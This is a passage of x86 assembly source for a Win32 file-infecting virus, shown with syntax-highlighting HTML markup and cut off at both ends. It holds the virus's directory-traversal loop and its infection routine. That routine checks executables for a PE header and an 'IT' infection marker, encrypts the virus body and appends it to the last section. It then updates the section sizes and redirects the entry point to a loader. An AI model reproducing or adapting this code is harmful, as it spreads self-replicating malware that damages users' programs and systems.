        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Find</span><span class="sc0">
     
 </span><span class="sc5">Updir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">Updir0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DotDot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindN</span><span class="sc0">         
        
 </span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;jmp to host code</span><span class="sc0">




</span><span class="sc1">;[Restore saved directory]:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DirExe</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_Stack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">                                 </span><span class="sc1">;push</span><span class="sc0">

        </span><span class="sc5">CurrentEip</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;CurrentEip</span><span class="sc0">

</span><span class="sc1">;[Jump to host original code]:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;***** End main routine</span><span class="sc0">

 </span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">




       </span><span class="sc6">pushad</span><span class="sc0">


 </span><span class="sc5">TestFile</span><span class="sc4">:</span><span class="sc0">


       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength</span><span class="sc0">
   
      
</span><span class="sc1">;***** Test if the file is a true PE-executable file</span><span class="sc0">
       
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFileStuff</span><span class="sc0">

       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitInfectError</span><span class="sc0"> 

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;save mapping address </span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">            </span><span class="sc1">;Avoid Fault Page </span><span class="sc0">

       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">


       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;edx points to PE-header</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">                 </span><span class="sc1">;true PE exe there?</span><span class="sc0">

       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">
      

</span><span class="sc1">;***** End of EXE-PE test</span><span class="sc0">

        

</span><span class="sc1">;***** Already infected? </span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"IT"</span><span class="sc0">             </span><span class="sc1">;infected?</span><span class="sc0">

       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitInfectError</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;**** End of infection test</span><span class="sc0">





</span><span class="sc1">;****** Search for header of target last section</span><span class="sc0">

           
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                            

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                             </span><span class="sc1">;edi=beginning of optional header</span><span class="sc0">


</span><span class="sc1">;[Compute the return address to target code]:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;ebx=Entry Point RVA</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;ebx=Entry Point address in </span><span class="sc0">
                                               </span><span class="sc1">;memory (add ImageBase) </span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldEip</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">;save it </span><span class="sc0">
            
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;cx=size of optionnal header</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;edi points to 1st section header</span><span class="sc0">

       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;cx= number of sections</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;ebx points on 1st section header</span><span class="sc0">

       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">20000000h</span><span class="sc0">        </span><span class="sc1">;Set code attribute in 1st section</span><span class="sc0">


</span><span class="sc1">;[Search for last section]:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">

       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 

       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

           
</span><span class="sc1">;Now:</span><span class="sc0">
</span><span class="sc1">;esi=beginning of last section header</span><span class="sc0">
</span><span class="sc1">;ebx=beginning of 1st section header (most of the time it's the code section)</span><span class="sc0">



 
</span><span class="sc1">;[Compute the place on disk where to put the code in the last section]:</span><span class="sc0">
 
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                          </span><span class="sc1">;edi holds mapaddress</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;don't want infect files</span><span class="sc0">
                                         </span><span class="sc1">;with pointer2rawdata=null</span><span class="sc0">
                                         </span><span class="sc1">;(see wwp32 packed Exe-files)</span><span class="sc0">
                                         </span><span class="sc1">;if we try ...file is overwritten!</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitInfectError</span><span class="sc0">
    
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">


</span><span class="sc1">;[Compute position on disk of loader code beginning]:</span><span class="sc0">


        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">LoaderLength</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                      </span><span class="sc1">;restore mapaddress </span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;save pointer to code loader</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;nope...not enough free bytes left</span><span class="sc0">
                                     </span><span class="sc1">;in end of code section...</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">ExitInfectError0</span><span class="sc0">        </span><span class="sc1">;don't want to corrupt the file!           </span><span class="sc0">
 
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;increment infection counter</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"IT"</span><span class="sc0">  </span><span class="sc1">;mark the infected target</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">;set FileAligment=200h</span><span class="sc0">





        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;esi=last section pointer on disk</span><span class="sc0">
 
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;add rounded up last section raw-size</span><span class="sc0">


</span><span class="sc1">;[Compute beginning of code in the last section ,in memory]:</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;last section address in memory</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;add last section rounded up size</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;add address base of target</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LastSectionCode</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;[Update size field in target optional header]:</span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirLength</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;[Update size fields in target last section header]:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;[Copy code in the last section]:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">EndVir</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">BeginVir</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

 </span><span class="sc5">Encrypt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Crypt</span><span class="sc0">

</span><span class="sc1">;[Compute new Entry Point]:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">LoaderLength</span><span class="sc0">        </span><span class="sc1">;this value is used several times after</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;so the use of sub edi,LoaderLength</span><span class="sc0">
                                    </span><span class="sc1">;isn't a good choice for optimisation </span><span class="sc0">
                                    </span><span class="sc1">;aim :(</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;Eip field in optional header updated </span><span class="sc0">

</span><span class="sc1">;[Copy loader code to target file on disk]:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;restore pointer (on disk) to code loader</span><span class="sc0">
        
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">BeginLoader</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFileStuff</span><span class="sc0">
        
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


 </span><span class="sc5">ExitInfectError0</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">



 </span><span class="sc5">ExitInfectError</span><span class="sc4">:</span><span class="sc0">
 
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFileStuff</span><span class="sc0">
 
        </span><span class="sc6">popad</span><span class="sc0">
 
        </span><span class="sc6">ret</span><span class="sc0">
      
 </span><span class="sc5">OpenFileStuff</span><span class="sc4">:</span><span class="sc0">
   
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">              </span><span class="sc1">;Read and Code abilities</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                     

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;save FileHandle </span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileMappingA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitOpenFileStuffError</span><span class="sc0">       

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;eax=Address of Mapping</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">   

        </span><span class="sc6">clc</span><span class="sc0">


        </span><span class="sc6">ret</span><span class="sc0">
     
 </span><span class="sc5">ExitOpenFileStuffError</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">


        </span><span class="sc6">ret</span><span class="sc0">

 

 </span><span class="sc5">CloseFileStuff</span><span class="sc4">:</span><span class="sc0">


 </span><span class="sc5">UnMap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

